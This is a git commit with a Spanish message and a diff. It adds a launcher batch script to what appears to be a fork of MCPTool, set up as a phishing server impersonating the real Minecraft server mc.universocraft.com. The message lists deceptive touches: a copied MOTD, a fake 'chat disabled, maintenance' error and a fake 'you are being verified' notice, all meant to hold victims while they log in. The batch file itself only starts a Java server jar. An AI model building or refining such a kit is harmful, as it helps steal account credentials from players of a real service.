2116a48f2200819b5d41b92f77c590ebc4f2e8b5
craciu25yt <48807342+craciu25yt@users.noreply.github.com>
2021-11-22 19:07:48 +1000

    Cosas del fork
    Phishing: 
      -MOTD editado de 1.8-1.16 a 1.8-1.17
      -Protocol Lib actualizado (No deja entrar a nadie)
     - Skript actualizado (No funcionaba la skript)
      -Añadido al hablar en el chat salte el error "El chat esta deshabilitado aqui. Si no logras entrar al servidor despues de logearte, probablemente se este realizando un mantenimiento. Intenta entrar nuevamente en unos minutos" 
      -Añadido el "¡Estas siendo verificado por nuestros servicios! Pronto te enviaremos a tu destino principal."
      -Menor peso mas optimizado

---
+++ config/phishing/mc.universocraft.com/iniciar.bat
@@ -0,0 +1,4 @@
+@echo off
+title MCPTool - Phishing to mc.universocraft.com
+java -Xms1G -Xmx1G -Dlog4j.skipJansi=true -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:InitiatingHeapOccupancyPercent=15 -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -jar server.jar nogui
+pause
